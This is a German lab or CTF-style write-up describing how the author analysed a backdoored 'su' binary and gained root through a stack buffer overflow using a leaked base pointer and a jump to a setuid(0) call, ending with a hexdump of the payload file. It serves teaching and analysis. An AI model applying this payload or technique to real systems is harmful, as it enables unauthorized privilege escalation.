## Dokumentation des Vorgehens zur Lösung der Aufgabe
### Allgemeine Informationen sammeln

1. Die gegebene IP anpingen -> Server ist erreichbar
1. HTTP-Request -> es läuft kein HTTP-Server`
1. `nmap` anwenden: Port 22 (ssh) ist offen
1. Login ist möglich
1. `uname -a`: Allgemeine Informationen zum System: Linux arch 4.5.4-1-ARCH #1 SMP PREEMPT x86_64 GNU/Linux
1. Logs versucht einzusehen: No Permissions
1. Installierte Programme einsehen und analysieren: __30 Minuten__ 
1. Berechtigungen anschauen: Dabei fiel auf, dass das Änderungsdatum der `su`-Binary von den anderen abweicht: Zufall
1. Vermutung: Rootkit in der Binary.
1. Einlesen zum Thema Rootkits: [^1][^2][^3]
1. `file` angewendet: su: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a6fdad0603136d4b68ee933c322f7908bbbb775e, stripped
1. `ldd` angewendet: keine Auffälligkeit
1. `su` ausgeführt: keine Auffälligkeit
1. Einlesen zum Thema Stackoverflow: [^4]


### Genauere Analyse
1. Fuzzing auf `su` angewendet: ab einer gewissen Länge -> bash: command not found
 1. Gleiches Verhalten auf Host-System: Ansatz verworfen
1. `Strings` angewendet:   
    Auffälligkeit:   
    `5f23 %#08lx` => Einbeziehung des ELF-Adressraumes: 0x405f23: __1.3 Stunden__
1. `su --help` ausgeführt: Auffälligkeit -> es gibt ein `-v --verbose` Flag. Dieses Flag wird in der manpage nicht erwähnt.
1. `su -v` ausgeführt: keine Auffälligkeit
1. `su -v 4` ausgeführt: keine Auffälligkeit: user 4 does not exist
1. `strace` ausgeführt: Geht nur bis zur Eingabe des Passworts
1. `strace` auf su prozess attachen: No permissions
1. Den `strace` output mit dem des Host-Systems vergleichen __1.7 Stunden__
1. Mit GDB debuggen: Keine neuen Informationen: __1 Stunde__
1. Mit Disassembler statisch analysiert (radare2 v.0.10.2)
    1. Main-Wrapper auflösen um die richtige Main-Methode zu finden
    1. Die `richtige` Main Funktion im Assembler analysiert: __6.5 Stunden__
1. `getopt`-Funktion suchen -> 0x4041e6  
    Auffälligkeit: `getopt`-Parameter: `v` erlaubt einen optionalen Parameter
1. `su -vx` ausgeführt: Es wird eine Adresse ausgegeben -> 0x7fffffffeaf0
1. ASLR (Address Space Layout Randomization) ist ausgeschaltet:  
    ```
    $ cat /proc/sys/kernel/randomize_va_space
    0
    ```  
    Auffälliger String könnte die Adresse einer wichtigen Stelle sein.
1. Original `su`-Quelltext angeschaut: Switch-Case über die Parameter __3 Stunden__
1. Mittels Disassembler die Stelle suchen, an der der Adressen-String benutzt wird:   
    0x40416d -> Parameter der `printf`-Funktion an 0x404177.  
    Stellt den '-v'-Fall des Switch-Cases dar.
1. `-v`-Case: nach der Ausgabe  wird eine Funktion aufgerufen:  
    Aufruf: 0x4041e6  
    Funktion: 0x40c2e1
1. Diese Funktion macht File-Handling-stuff.
1. Zunächst vermutet, es handelt sich nicht mehr um den `-v`-Case.
1. `su -vDatei.txt` ausgeführt: Segmentation fault: __2.0 Stunden__
1. Herausfinden, wie groß die Datei mindestens sein muss, um einen Segmentation fault auszulösen:   
    137 Zeichen; vielleicht sind aber noch weitere Bytes durch Variablen belegt, bevor Base-Pointer und Instruction-Pointer kommen:  
    144 Zeichen bis Basepointer: __11.5 Stunden__
1. Mittels der Analyse im Disassembler eine Stelle suchen, die ausgenutzt werden kann: execvp gefunden: 0x404777: __1 Stunde__
1. Die Adresse des Exec-Befehls an Datei.txt anhängen: Keine Veränderung.
1. Analyse der Adress-Ausgabe: Der Basepointer wird ausgegeben.
1. Die Ausgabe von `-v` ist der Basepointer: Dieser muss gesichert werden.
1. Basepointer vor der `execvp`-Adresse in die Datei.txt einfügen. __3 Stunden__
1. `su -vDatei.txt` ausführen: keine Änderung
1. `su -vDatei.txt ls` ausführen: `ls` wird mit den normalen User-Rechten ausgeführt. 
1. Weitersuchen im Assembler: Funktion oberhalb des Exec-Aufrufs genauer ansehen:  
    Benutzt: 0x404735  
    Funktion: 0x402dd9: 
    __4 Stunden__
1. Die Funktion ruft `setuid` und `setgid` auf (jeweils 0 als Argument):  
    Ersetzen der Exec-Adresse in der Datei mit der Adresse des Funktionsaufrufs (s.o.)
1. `su -vDatei.txt ls` ausführen: `ls`: wird als root ausgeführt __30 Minuten__ 

### Hexdump der Datei

```
$ hexdump --no-squeezing --canonical Datei.txt
00000000  78 78 78 78 78 78 78 78  78 78 78 78 78 78 78 78  |xxxxxxxxxxxxxxxx|
00000010  78 78 78 78 78 78 78 78  78 78 78 78 78 78 78 78  |xxxxxxxxxxxxxxxx|
00000020  78 78 78 78 78 78 78 78  78 78 78 78 78 78 78 78  |xxxxxxxxxxxxxxxx|
00000030  78 78 78 78 78 78 78 78  78 78 78 78 78 78 78 78  |xxxxxxxxxxxxxxxx|
00000040  78 78 78 78 78 78 78 78  78 78 78 78 78 78 78 78  |xxxxxxxxxxxxxxxx|
00000050  78 78 78 78 78 78 78 78  78 78 78 78 78 78 78 78  |xxxxxxxxxxxxxxxx|
00000060  78 78 78 78 78 78 78 78  78 78 78 78 78 78 78 78  |xxxxxxxxxxxxxxxx|
00000070  78 78 78 78 78 78 78 78  78 78 78 78 78 78 78 78  |xxxxxxxxxxxxxxxx|
00000080  78 78 78 78 78 78 78 78  78 78 78 78 78 78 78 78  |xxxxxxxxxxxxxxxx|
00000090  10 eb ff ff ff 7f 00 00  35 47 40                 |........5G@|
0000009b
```

[^1]: de.wikipedia.org/wiki/Rootkit
[^2]: en.wikipedia.org/wiki/Rootkit
[^3]: www.sans.org/reading-room/whitepapers/linux/linux-rootkits-beginners-prevention-removal-901
[^4]: www-scf.usc.edu/~csci530l/downloads/stackoverflow_en.pdf
